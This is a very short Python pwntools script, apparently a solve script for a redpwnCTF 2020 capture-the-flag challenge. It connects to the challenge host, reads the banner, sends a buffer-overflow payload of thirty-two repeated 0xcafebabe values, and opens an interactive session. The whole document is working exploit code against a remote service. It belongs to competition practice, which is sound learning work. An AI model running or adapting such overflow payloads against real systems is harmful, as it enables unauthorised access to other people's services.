from pwn import *

p = remote('2020.redpwnc.tf', 31255)

p.recvrepeat(1)


p.sendline(p64(0xcafebabe)*0x20)


p.interactive()
